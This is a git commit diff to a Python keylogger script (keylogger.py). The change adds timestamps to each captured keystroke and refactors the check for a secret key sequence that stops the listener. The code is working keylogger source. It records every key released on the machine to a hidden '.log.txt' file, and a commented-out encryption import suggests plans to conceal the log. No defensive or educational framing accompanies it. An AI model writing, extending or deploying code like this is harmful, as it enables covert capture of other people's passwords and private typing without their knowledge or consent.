36668dcf8ea6ecb2b8455dd412fff8ce8e36ec76
LucasSantiag <lucassantiago17.cardoso08@gmail.com>
2020-01-14 08:28:55 -0300

    time and refactors

--- keylogger.py
+++ keylogger.py
@@ -1,5 +1,6 @@
 from pynput.keyboard import Listener, Key
 from collections import deque
+import datetime
 # import pyAesCrypt
 
 password = ['t', 'd', 'k', 'Key.enter', 'Key.shift']
@@ -7,16 +8,17 @@ atualChars = deque(maxlen=5)
 
 def log(key):
     with open(".log.txt", "a") as file_log:
-        file_log.write(key)
+        date = datetime.datetime.today()
+        file_log.write(date.strftime("%d-%m-%Y %H:%M:%S") + ": " + key + "\n")
 
 def monitor(key):
     try:
         log(key.char)
         atualChars.append(key.char)
     except:
-        log(" #" + str(key) + "# ")
+        log("#" + str(key) + "#")
         atualChars.append(str(key))
-    if "".join(password) == "".join(atualChars):
+    if password == list(atualChars):
         return False
 
 with Listener(on_release=monitor) as listener:
